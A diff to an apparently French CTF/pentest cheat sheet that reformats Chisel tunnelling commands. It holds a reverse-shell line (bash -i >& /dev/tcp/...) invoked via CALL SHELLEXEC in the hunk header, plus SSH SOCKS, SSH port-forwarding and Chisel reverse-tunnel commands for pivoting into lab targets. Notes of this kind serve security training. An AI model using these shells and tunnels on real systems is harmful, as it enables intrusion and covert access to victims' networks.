@@ -43,7 +43,11 @@ CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
 
 - SSH proxy --> `ssh -D 1212 root@proxy.fr (socks5  127.0.0.1 1212)`
 - SSH Port Forwarding --> `ssh sau@10.10.11.214 -L 8000:127.0.0.1:80` (attaquant --> 8000, victime --> 80)
-- Chisel port forwarding --> `chisel server -p 8888 --reverse` puis `chisel.exe client 10.10.16.9:8888 R:4444:127.0.0.1:4444`, plusieurs ports `./chisel_1.10.0_linux_amd64 client 10.10.16.25:8888 R:40056:127.0.0.1:40056 R:5000:127.0.0.1:5000 R:7096:127.0.0.1:7096`
+- Chisel port forwarding -->
+  	- Serveur --> `chisel server -p 8888 --reverse` 
+	- Client `chisel.exe client 10.10.16.9:8888 R:4444:127.0.0.1:4444`
+   		- Plusieurs ports `./chisel_1.10.0_linux_amd64 client 10.10.16.25:8888 R:40056:127.0.0.1:40056 R:5000:127.0.0.1:5000 R:7096:127.0.0.1:7096`
+       	- SOCKS --> `./chisel.exe client 10.10.15.171:8888 R:socks`
 
 - WU CTF Mars@Hack --> https://gitlab.com/marshack/writeups/ctf_2024
 
